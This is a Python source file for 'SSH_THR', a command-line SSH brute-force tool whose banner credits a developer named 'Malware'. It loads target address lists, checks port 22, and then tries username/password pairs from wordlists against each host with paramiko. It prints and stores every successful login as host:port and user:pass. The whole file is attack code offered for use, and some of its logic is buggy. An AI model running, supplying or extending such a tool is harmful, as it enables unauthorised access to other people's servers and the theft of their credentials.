#SSH_THR | Build Version 1.3 | - No Potential Errors Currently | Possible Fixes {Regarding Class}
import paramiko 
import time 
from colorama import Fore 
import threading 
from pyfiglet import figlet_format 
import os 
import socket

def end_count():
	time.sleep(1)
	if len(validatt) >= 1:
		print(Fore.GREEN + 'Valid Connections: %s - Invalid Connections: %s' %(len(validatt),len(invalidatt)))
	else:
		print(Fore.GREEN + 'Valid Connections: %s - Invalid Connections: %s' %(len(validatt),len(invalidatt)))
		print(Fore.RED + 'There Appears To Be No Valid Connection Attempts - Restarting...')
		validation_second()

def try_ssh_bruteforce():
	time.sleep(1)
	op1 = open(l1,'r').readlines()
	op2 = open(l2,'r').readlines()
	userlist1 = []
	passlist1 = []
	global validatt 
	validatt = []
	global invalidatt
	invalidatt = []
	for i in op1:
		userlist1.append(i)
	for i in op2:
		passlist1.append(i)
	userpasstg = zip(userlist1,passlist1)
	aclient = paramiko.client.SSHClient()
	aclient.set_missing_host_key_policy(paramiko.AutoAddPolicy)
	port = 22
	for i in valid_addr_list:
		for userl,passl in userpasstg:
			n1 = str(userl.strip())
			n2 = str(passl.strip())
			try:
				aclient.connect(i,22,n1,n2)
				print(Fore.GREEN + 'Valid Attempt On %s:%s with %s:%s' %(i,port,n1,n2))    # < -- Requires Fixing
				validatt.append('%s:%s - %s:%s - CON ' %(i,port,n1,n2))
			except Exception:
				print(Fore.RED + 'Invalid Attempt On %s:%s with %s:%s,%s' %(i,port,n1,n2))
				invalidatt.append('%s:%s - %s:%s - CONERR' %(i,port,n1,n2))
	time.sleep(1)
	end_count()
			
def get_user_pass_list():
	time.sleep(1)
	cri = 0
	print(Fore.RED + 'Wait! We Need Your User and Pass List {Enter User List First}')
	global l1
	l1 = input(Fore.RED + 'ssh@thr:~$ ')
	global l2
	l2 = input(Fore.RED + 'ssh@thr:~$ ')
	fn = '.txt'
	if fn in l1 and l2:
		cri += 2
	else:
		pass
	for i in os.listdir(os.getcwd()):
		if l1 and l1 == i:
			cri += 2
		else:
			pass
	if cri == 4:
		return True 
	else:
		return False
		
def try_addr_list_con(addr):
	global valid_addr_list
	valid_addr_list = []
	global invalid_addr_list
	invalid_addr_list = []
	op = open(addr,'r').readlines()
	for i in op:
		try:
			s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
			s.connect((i,22))
			valid_addr_list.append(i)
		except Exception:
			invalid_addr_list.append(i)
	time.sleep(1)
	if len(valid_addr_list) < 1:
		print(Fore.RED + 'ADDR_LIST_STATE | Valid ADDRS: %s | Invalid ADDRS: %s | ' %(len(valid_addr_list),len(invalid_addr_list)))
		print(Fore.RED + "Restarting... 0 Valid ADDRS")
		validation_second()
	else:
		print(Fore.GREEN + 'ADDR_LIST_STATE | Valid ADDRS: %s | Invalid ADDRS: %s | ' %(len(valid_addr_list),len(invalid_addr_list)))
		time.sleep(1)
		print(Fore.GREEN + 'Trying | %s | Valid ADDRS ' %(len(valid_addr_list)))
		if get_user_pass_list():
			print(Fore.GREEN + 'Both Lists Valid | Criteria Success | ')
			time.sleep(0.7)
			print(Fore.GREEN + 'Trying SSH BruteForce Using %s:%s with %s ' %(l1,l2,addrlist))
			try_ssh_bruteforce()
		else:
			print(Fore.RED + 'One Or More Lists Are Invalid | Criteria Error |')
						
def validate_addr_list(addr):
	for i in os.listdir(os.getcwd()):
		if addr == i:
			return True
		else:
			return False

def enter_dir():
	print(Fore.RED + 'Enter Directory Name, Not Path (Enter Filename Second)')
	enter_d = input(Fore.RED + 'ssh@thr:~$ ')
	check_for_file = input(Fore.RED + 'ssh@thr:~$ ')
	firstpath = os.path.abspath(__file__)
	flen = len(firstpath) - len(__file__)
	fp = firstpath[:flen]
	dd = str(fp) + str(enter_d)
	global return_f
	return_f = []
	for i in os.listdir(dd):
		if check_for_file == i:
			os.chdir(dd)
			print(Fore.GREEN + 'ADDR_LIST | %s | Is Valid' %(check_for_file))
			try_addr_list_con(check_for_file) 
		else:
			print(Fore.RED + 'ADDR_LIST | %s | Is Invalid' %(check_for_file))
			time.sleep(1)
			validation_second()
	
def validation_second():
	print(Fore.RED + 'Please Enter Your Address List, Format to .txt')
	print(Fore.RED + "PUT THIS PY FILE IN THE DIRECTORY OF YOUR LIST OR ENTER D FOR A DIFFERENT DIR")
	global addrlist
	addrlist = input(Fore.RED + "ssh@thr:~$ ")
	if addrlist == 'd':
		enter_dir()
	else:
		pass
	if validate_addr_list(addrlist):
		print(Fore.GREEN + 'ADDR_LIST | %s | Is Valid' %(addrlist))
		try_addr_list_con(addrlist) 
	else:
		print(Fore.RED + 'ADDR_LIST | %s | Is Invalid' %(addrlist))
		time.sleep(1)
		validation_second()

def banner():
	time.sleep(1)
	print(Fore.RED + figlet_format('		                     SSH_THR',font='bubble'))
	print(Fore.LIGHTBLACK_EX + """
    		========================================
		Project Developer: Malware
		Version: 1.2
		Please Enter The Name Of Your Addr List
		========================================
				""")
	validation_second()

if __name__ == '__main__':
	banner()
